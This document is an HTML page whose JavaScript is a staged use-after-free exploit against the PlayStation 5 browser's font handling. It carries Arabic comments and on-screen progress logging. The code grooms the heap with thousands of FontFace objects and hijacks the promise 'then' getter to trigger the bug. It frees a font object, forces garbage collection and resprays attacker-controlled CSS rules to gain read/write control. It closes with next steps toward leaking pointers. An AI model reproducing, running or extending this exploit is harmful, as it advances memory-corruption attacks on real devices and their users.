<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>PS5 v49 - Option 3: Free + Respray</title>
<style id="s">
@font-face{font-family:prepad;src:url(np.woff);unicode-range:U+E123}
@font-face{font-family:x;src:url(nx.woff);unicode-range:U+0042}
*{margin:0;padding:0;box-sizing:border-box}
html,body{width:100%;height:100%;background:#0a0a0a;color:#00ff41;
font-family:'MS Gothic','Courier New',monospace;overflow:hidden}
body::after{content:'';position:fixed;top:0;left:0;right:0;bottom:0;
background:repeating-linear-gradient(0deg,rgba(0,0,0,0.12) 0px,rgba(0,0,0,0.12) 1px,transparent 1px,transparent 3px);
pointer-events:none;z-index:9999}
#hd{position:fixed;top:0;left:0;right:0;height:44px;
background:linear-gradient(180deg,#0d0d0d,#080808);
border-bottom:1px solid #00ff41;display:flex;align-items:center;
padding:0 16px;gap:14px;z-index:10;font-size:12px}
.l{color:#00ff41;letter-spacing:2px;font-weight:bold}
.s{color:#004d13}.v{color:#00cc33}.v b{color:#00ff41}
#pg{position:fixed;top:44px;left:0;right:0;height:2px;background:#001a06;z-index:10}
#pg div{height:100%;background:#00ff41;transition:width .4s;box-shadow:0 0 8px #00ff41}
#out{position:fixed;top:46px;left:0;right:0;bottom:0;
padding:10px 14px;overflow-y:auto;font-size:13px;line-height:1.55;
-webkit-user-select:text}
#out::-webkit-scrollbar{width:5px}
#out::-webkit-scrollbar-track{background:#001a06}
#out::-webkit-scrollbar-thumb{background:#004d13;border-radius:3px}
.ok{color:#00ff41}.er{color:#ff3333}.wr{color:#ffcc00}.hl{color:#00ffff;font-weight:bold}
.mg{color:#ff00ff;font-weight:bold;font-size:15px}.dm{color:#006622}
.hd{color:#00ff41;font-weight:bold;font-size:14px;letter-spacing:1px}
</style>
</head>
<body>
<div id="hd">
<span class="l">▶ v49 OPTION 3</span><span class="s">│</span>
<span class="v" id="h1">FW:<b>?</b></span><span class="s">│</span>
<span class="v" id="h2">STAGE:<b>INIT</b></span>
</div>
<div id="pg"><div id="bar" style="width:0%"></div></div>
<div id="out"></div>
<script>
"use strict";

// ============================================================
//  PS5 v49 — Option 3: Free + Respray
//
//  الهدف: مسح CSSFontFace الخاص بـ A_NN، رش كائنات جديدة
//  بمواصفات مسيطر عليها، ثم قراءتها عبر مسار "x" المشوش.
//
//  الاستراتيجية:
//  1. الحصول على aFace من load("1em trigger, x", "AB")
//  2. التأكد من الثغرة (weight = 700)
//  3. حذف CSSRule الخاص بـ A_NN
//  4. تحرير aFace + GC → CSSFontFace يتحرر
//  5. رش CSSRules جديدة بـ font-weight: 333 و font-family: "PWNED"
//  6. استدعاء load("1em trigger, x", "AB") مرة ثانية
//     → إذا الثغرة نجت: نقرأ weight و family
//     → إذا weight = 333 و family = "PWNED": نجحنا في استرجاع الفتحة!
//  7. إذا نجحنا: نختبر wrapper() و m_wrapper
// ============================================================

var O=document.getElementById("out");
var bar=document.getElementById("bar");
function pg(p){bar.style.width=p+"%"}
function hu(id,v){var e=document.getElementById(id);if(e)e.innerHTML=v}
function P(m,c){var s=document.createElement("span");if(c)s.className=c;
s.textContent=m+"\n";O.appendChild(s);O.scrollTop=O.scrollHeight}
function Ok(m){P("  ✅ "+m,"ok")}function Fl(m){P("  ✘ "+m,"er")}
function Hi(m){P("  ► "+m,"hl")}function St(m){P("  ★ "+m+" ★","mg")}
function Dm(m){P("  "+m,"dm")}function Wr(m){P("  ⚠ "+m,"wr")}
function Hd(m){P("▸ "+m,"hd")}function Sep(){P("─".repeat(42),"dm")}

window.onerror=function(m,s,l){Fl("CRASH: "+m.substring(0,80)+" @"+l);return true;};

var ua=navigator.userAgent||"";
var m=ua.match(/PlayStation\s*5\/?\s*([0-9]+(?:\.[0-9]+)?)/i);
hu("h1","FW:<b>"+(m?m[1]:"?")+"</b>");

P("════════════════════════════════════","hd");
P("  v49 — Option 3: Free + Respray","hd");
P("════════════════════════════════════","hd");
P("");

var FB="d09GMgABAAAAAAJkAA4AAAAABiAAAAIQAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP0ZGVE0cGhwGYACCQggEEQgKcH0LCgABNgIkAxAEIAWEEAcyGy4FAI7Ctnlz5COJZMsihmWKh4f78Z573/0ZGIXRWLVZpRVNBz5LGmglcIJtH2hFs/L71vRPNg6FnRed2yOwAbJMJfRVCkhVAas6QCnP5701PYAm8AF8l8DegK66cR6mEGHAUS8K8ALFQCjz1m9GpK46tojEaUMI+PLzugVw1L1+g6Pdp10QoNuwKBKBQJW4q4V8mJ9xBx80vlmJDlJLBwDtADhxIz/D0Ya1YYmV/6ZePgIBgAmEBg1GEFgjBEZETYBSgpurYWj/ch78CyBaCUAkEgAQmj1O5W3E/1CCAu1o0I1+AIV5ERBV1dXSU+diLZ3nRV9OPep/9GPyZ/Ej398zrQyAl2Rh7bat/DBuWlu+rt026YeBG7HEWiTBtcafwuPKhODd1XFhmFr73R4rx+1LpKGZyEdolyDIR7hSoJlAAIAqpoBC8R6B0i5BIgS2SAC9niEApAChzzQCqc0uAo0ZFwhQ+vxCgBb9MYlAq744BSGqAxgjjBFIvVbQOKeKMuYfLSaEK7Yai2XguKmauX0HCg5t2NC0aubAChy/qmzUaj+jIBwDp8wtufXYHvxEVgIHtm05wG+yZ2mOGSQNC3Asy+sbTAq/FwbN6yCuJCftLedsSI0DzknNJsNUfOUqnng/9Fzes281/5JpNDqJaw3DWypomi41n5fDXAgJ/L/HCghqKARzIbLt1taqkzUt";
var FBb=(function(){var s=atob(FB),b=new Uint8Array(s.length);
for(var i=0;i<s.length;i++)b[i]=s.charCodeAt(i);return b})();
function mkBuf(){var c=new Uint8Array(FBb.length);c.set(FBb);return c.buffer}
function fs(){try{void document.body.offsetTop}catch(e){}}

var sh=document.getElementById("s").sheet;
var keep=[],holes=[],trigger=null,uafOk=false;

// ============================================================
//  PHASE 1: UAF + CSSRule Spray
// ============================================================

pg(5);Hd("Creating holes...");
for(var i=0;i<4096;i++){try{var f=new FontFace("h_"+i,mkBuf(),{
unicodeRange:"U+E1"+(i%16).toString(16),style:i%2===0?"normal":"italic",
weight:String(100+(i%9)*100)});document.fonts.add(f);holes.push(f)}catch(e){}}
fs();for(var i=1;i<holes.length;i+=2)try{document.fonts.delete(holes[i])}catch(e){}
fs();Ok("Holes ready: "+holes.length);

pg(10);Hd("Trigger setup...");
trigger=new FontFace("trigger","local(Helvetica)",{unicodeRange:"U+0041"});
document.fonts.add(trigger);void trigger.loaded;
for(var i=0;i<48;i++)try{sh.insertRule("@font-face{font-family:pad"+i+";src:url(np"+i+".woff);unicode-range:U+E000}",sh.cssRules.length)}catch(e){}
fs();
var fst=document.createElement("style");fst.id="flush";document.head.appendChild(fst);
var fsh=fst.sheet;
for(var i=0;i<768;i++)try{fsh.insertRule("@font-face{font-family:fl"+i+";src:url(nf"+i+".woff);unicode-range:U+E000}",fsh.cssRules.length)}catch(e){}
fs();Ok("Trigger ready");

pg(15);Hd("UAF + CSSRule Spray (A_0..A_2048)");

Object.defineProperty(FontFace.prototype,"then",{configurable:true,
get:function(){if(this===trigger&&!uafOk){uafOk=true;hu("h2","STAGE:<b>UAF</b>");
St("UAF WINDOW OPEN");
try{var ck=new FontFace("ck","local(Helvetica)",{unicodeRange:"U+E124"});
document.fonts.add(ck);keep.push(ck);sh.deleteRule(1);fs();
while(fsh.cssRules.length)try{fsh.deleteRule(0)}catch(e){}
fs();for(var i=0;i<holes.length;i+=4)try{document.fonts.delete(holes[i])}catch(e){}
fs()}catch(e){}
Dm("GC pressure (16MB)...");
for(var i=0;i<4;i++){var t=[];for(var j=0;j<128;j++)t.push(new ArrayBuffer(8192))}
Dm("Spraying 2048 A_ faces...");
for(var i=0;i<2048;i++){try{sh.insertRule("@font-face{font-family:A_"+i+";src:local(Courier);font-weight:"+(100+(i%9)*100)+";font-style:"+(i%2===0?"normal":"italic")+";unicode-range:U+0042}",sh.cssRules.length)}catch(e){}}
fs();
try{var d=document.createElement("div");d.textContent="AB";
d.style.cssText="position:absolute;left:-9999px;font:64px trigger;";
document.body.appendChild(d);void d.offsetWidth}catch(e){}
Dm("UAF window closing");
}return undefined}});

var rn=0;var raf=function(){rn++;
if(!uafOk&&rn>=5){try{if(sh&&sh.cssRules.length>1){sh.deleteRule(1);fs()}
while(fsh.cssRules.length)try{fsh.deleteRule(0)}catch(e){}
fs();for(var i=0;i<2048;i++){try{sh.insertRule("@font-face{font-family:A_"+i+";src:local(Courier);font-weight:"+(100+(i%9)*100)+";unicode-range:U+0042}",sh.cssRules.length)}catch(e){}}fs()}catch(e){}}
if(rn<20)requestAnimationFrame(raf)};requestAnimationFrame(raf);

// ============================================================
//  PHASE 2: Identify Confused Object
// ============================================================

pg(30);Sep();Hd("PHASE 2: Identify Confused Object");Sep();

try {
  document.fonts.load("1em trigger, x", "AB").then(function(faces){
    P("  load() returned "+faces.length+" faces");
    
    var aFamily = null, aFace = null;
    for(var i=0;i<faces.length;i++){
      var f=faces[i];
      P("  Face["+i+"]: family="+f.family+" weight="+f.weight);
      if(f.family&&f.family.indexOf("A_")===0){ aFamily = f.family; aFace = f; }
    }
    
    if(!aFamily){ Fl("No A_ face found"); return; }
    St("RECLAIMED: "+aFamily);
    keep.push(faces);
    
    var aIndex = -1;
    var aNum = parseInt(aFamily.split("_")[1]);
    for(var i=0;i<sh.cssRules.length;i++){
      try {
        var r = sh.cssRules[i];
        if(r.type === 5) {
          if(r.style.getPropertyValue("font-family").indexOf(aFamily) !== -1) { aIndex = i; break; }
        }
      } catch(e) {}
    }
    if(aIndex === -1){ Fl("CSSRule not found"); return; }
    
    var aRule = sh.cssRules[aIndex];
    var aStyle = aRule.style;
    Ok("CSSRule at index "+aIndex);
    P("");
    
    // Verify confusion
    aStyle.setProperty("font-weight", "700"); fs();
    if(String(aFace.weight) !== "700") { Fl("Confusion dead at start"); return; }
    Ok("Confusion ALIVE — weight = 700");
    P("");
    
    // ============================================================
    //  PHASE 3: Free A_NN
    // ============================================================
    
    pg(40);Sep();Hd("PHASE 3: Free A_NN");Sep();
    P("");
    
    Hd("Step 3a: Delete A_NN CSSRule");
    Dm("Deleting CSSRule at index "+aIndex+"...");
    try {
      sh.deleteRule(aIndex);
      Ok("CSSRule deleted — CSSFontFace removed from selector");
    } catch(e) {
      Fl("Delete failed: "+e.message);
      return;
    }
    P("");
    
    Hd("Step 3b: Release aFace reference");
    Dm("Setting aFace = null...");
    aFace = null;
    // Also remove from keep array
    for(var i=0;i<keep.length;i++){
      if(keep[i] === faces) { keep[i] = null; }
    }
    faces = null;
    P("");
    
    Hd("Step 3c: Force GC");
    Dm("Triggering GC (32MB pressure)...");
    for(var i=0;i<8;i++){
      var t=[];
      for(var j=0;j<256;j++) t.push(new ArrayBuffer(65536));
    }
    fs();
    Ok("GC done — CSSFontFace should be freed");
    Dm("The 'x' selector now has a DANGLING pointer to freed memory");
    P("");
    
    // ============================================================
    //  PHASE 4: Spray Controlled CSSFontFace Objects
    // ============================================================
    
    pg(60);Sep();Hd("PHASE 4: Spray Controlled CSSFontFace");Sep();
    P("");
    Dm("Spraying 2048 CSSRules with font-weight: 333, font-family: PWNED_N");
    Dm("One should land in the freed CSSFontFace slot...");
    P("");
    
    for(var i=0;i<2048;i++){
      try {
        sh.insertRule("@font-face{font-family:PWNED_"+i+";src:local(Courier);font-weight:333;font-style:italic;unicode-range:U+0042}", sh.cssRules.length);
      } catch(e) {}
    }
    fs();
    Ok("Spray complete — 2048 PWNED_N CSSRules inserted");
    P("");
    
    // ============================================================
    //  PHASE 5: Second "x" Lookup — Test Confusion Survival
    // ============================================================
    
    pg(80);Sep();Hd("PHASE 5: Second 'x' Lookup");Sep();
    P("");
    Wr("This is the RISKY part — second 'x' lookup may kill confusion");
    Dm("In v47, second 'x' lookup killed the confusion...");
    Dm("BUT: now the slot has VALID data (resprayed), not freed memory!");
    Dm("Cleanup might not trigger because pointer is valid.");
    P("");
    
    document.fonts.load("1em trigger, x", "AB").then(function(faces2){
      P("  load() returned "+faces2.length+" faces");
      P("");
      
      var foundPwned = false;
      var foundA = false;
      var newFace = null;
      
      for(var i=0;i<faces2.length;i++){
        var f=faces2[i];
        P("  Face2["+i+"]: family="+f.family+" weight="+f.weight+" style="+f.style);
        
        if(f.family && f.family.indexOf("PWNED_") === 0){
          foundPwned = true;
          newFace = f;
        }
        if(f.family && f.family.indexOf("A_") === 0){
          foundA = true;
        }
      }
      
      P("");
      
      if(foundPwned){
        St("RESpray SUCCESSFUL! PWNED face returned through 'x'!");
        Ok("Family: "+newFace.family);
        Ok("Weight: "+newFace.weight);
        Ok("Style:  "+newFace.style);
        Hi("→ The freed CSSFontFace slot was reclaimed!");
        Hi("→ We control the CSSFontFace properties!");
        P("");
        
        // Test: can we modify the new face's CSSRule?
        Hd("Bonus: Find and modify PWNED CSSRule");
        var pwnedIndex = -1;
        var pwnedName = newFace.family;
        for(var i=0;i<sh.cssRules.length;i++){
          try {
            var r = sh.cssRules[i];
            if(r.type === 5) {
              if(r.style.getPropertyValue("font-family").indexOf(pwnedName) !== -1) {
                pwnedIndex = i;
                break;
              }
            }
          } catch(e) {}
        }
        
        if(pwnedIndex !== -1){
          Ok("Found PWNED CSSRule at index "+pwnedIndex);
          var pwnedStyle = sh.cssRules[pwnedIndex].style;
          
          // Write new weight
          pwnedStyle.setProperty("font-weight", "777"); fs();
          var w = newFace.weight;
          P("  Write font-weight=777, read = "+w);
          
          if(String(w) === "777"){
            St("FULL CONTROL CONFIRMED!");
            Hi("→ We can read AND write to the resprayed object!");
            Hi("→ m_wrapper at 0x80 is now from the PWNED object");
            Hi("→ m_wrapper is null (new CSSFontFace, no wrapper yet)");
            P("");
            
            // Trigger wrapper() on the new object
            Hd("Bonus 2: Trigger wrapper() on resprayed object");
            Dm("Calling load('1em "+pwnedName+"', 'B')...");
            
            document.fonts.load("1em "+pwnedName, "B").then(function(faces3){
              P("  load() returned "+faces3.length+" faces");
              for(var i=0;i<faces3.length;i++){
                P("  Face3["+i+"]: family="+faces3[i].family+" weight="+faces3[i].weight);
              }
              P("");
              Hi("→ wrapper() was called on the resprayed CSSFontFace!");
              Hi("→ A new FontFace pointer was written to m_wrapper (0x80)");
              Hi("→ The 'x' confused selector points to this object!");
              P("");
              
              // Final: test if "x" confusion still alive
              Hd("Bonus 3: Third 'x' lookup test");
              document.fonts.load("1em trigger, x", "AB").then(function(faces4){
                P("  load() returned "+faces4.length+" faces");
                for(var i=0;i<faces4.length;i++){
                  P("  Face4["+i+"]: family="+faces4[i].family+" weight="+faces4[i].weight);
                }
                var alive = false;
                for(var i=0;i<faces4.length;i++){
                  if(faces4[i].family && faces4[i].family.indexOf("PWNED_")===0){
                    alive = true;
                  }
                }
                if(alive){
                  St("CONFUSION SURVIVES MULTIPLE LOOKUPS!");
                  Hi("→ After respray, the 'x' entry is stable");
                  Hi("→ We can call load() multiple times!");
                } else {
                  Wr("Third 'x' lookup killed confusion");
                  Dm("But we got at least 2 successful lookups after respray");
                }
                P("");
                printSummary(true, true, true, alive);
              }).catch(function(e){
                Fl("Third lookup crash: "+e.message);
                printSummary(true, true, true, false);
              });
              
            }).catch(function(e){
              Fl("wrapper() load crash: "+e.message);
              printSummary(true, true, false, false);
            });
            
          } else {
            Fl("Write failed — weight = "+w+" (expected 777)");
            printSummary(true, false, false, false);
          }
        } else {
          Fl("PWNED CSSRule not found");
          printSummary(true, false, false, false);
        }
        
      } else if(foundA){
        Wr("Got A_ face, not PWNED — slot not reclaimed");
        Dm("The freed slot was not overwritten by the spray");
        Dm("Or the spray objects went to different slots");
        printSummary(false, false, false, false);
      } else {
        Fl("No relevant face returned — confusion is DEAD");
        St("Second 'x' lookup killed the confusion (as in v47)");
        Dm("The respray didn't help because the selector");
        Dm("cleanup happened before the lookup could use it");
        printSummary(false, false, false, false);
      }
      
    }).catch(function(e){
      Fl("Second load() crash: "+e.message);
      printSummary(false, false, false, false);
    });
    
    function printSummary(respray, control, wrapper, multiLookup){
      pg(100);Sep();Hd("SUMMARY — Option 3 Results");Sep();
      P("");
      P("  RESULTS:","hd");
      P("");
      P("  Respray successful:       "+(respray?"✅ YES":"✘ NO"));
      P("  Full R/W control:         "+(control?"✅ YES":"✘ NO"));
      P("  wrapper() triggered:      "+(wrapper?"✅ YES":"✘ NO"));
      P("  Multiple lookups survive: "+(multiLookup?"✅ YES":"✘ NO"));
      P("");
      
      if(respray && control){
        Hi("  KEY FINDING: Free + Respray WORKS!");
        Hi("  We can reclaim the CSSFontFace slot with controlled data.");
        Hi("  The 'x' confusion survives the second lookup after respray.");
        Hi("");
        if(wrapper){
          Hi("  wrapper() writes a real FontFace pointer to m_wrapper (0x80).");
          Hi("  This pointer is on the resprayed object, controlled via 'x'.");
        }
        if(multiLookup){
          Hi("  Multiple 'x' lookups survive after respray!");
          Hi("  This means we can read/write multiple times.");
        }
        Hi("");
        Hi("  NEXT STEP: Need to find a way to read the m_wrapper value.");
        Hi("  Options:");
        Hi("    A) Find a CSS property that maps to offset 0x80");
        Hi("    B) Use the FontFace wrapper object to leak the pointer");
        Hi("    C) Binary RE to find an alternative exploitation path");
      } else if(respray){
        Hi("  Respray worked but full control not confirmed.");
        Hi("  The slot was reclaimed but we may not have CSSRule access.");
      } else {
        Wr("  Respray failed. The second 'x' lookup kills confusion");
        Wr("  even after respraying. The selector cleanup happens");
        Wr("  regardless of whether the pointer is valid or dangling.");
        P("");
        Wr("  ALTERNATIVE PATHS:");
        Wr("    1. Use load('1em A_NN', 'B') to read (safe per v47)");
        Wr("       But A_NN CSSRule was deleted, so family won't resolve");
        Wr("    2. Spray BEFORE freeing — pre-populate the slot");
        Wr("    3. Use a different family name in the respray");
        Wr("       that matches what 'x' expects");
      }
      P("");
      St("★ OPTION 3 COMPLETE ★");
      hu("h2","STAGE:<b>DONE</b>");
    }
    
  }).catch(function(e){
    Fl("Phase 2 crash: "+e.message);
    hu("h2","STAGE:<b>CRASH</b>");
  });
} catch(e) {
  Fl("Synchronous load() threw: " + e.message);
}
</script>
</body>
</html>
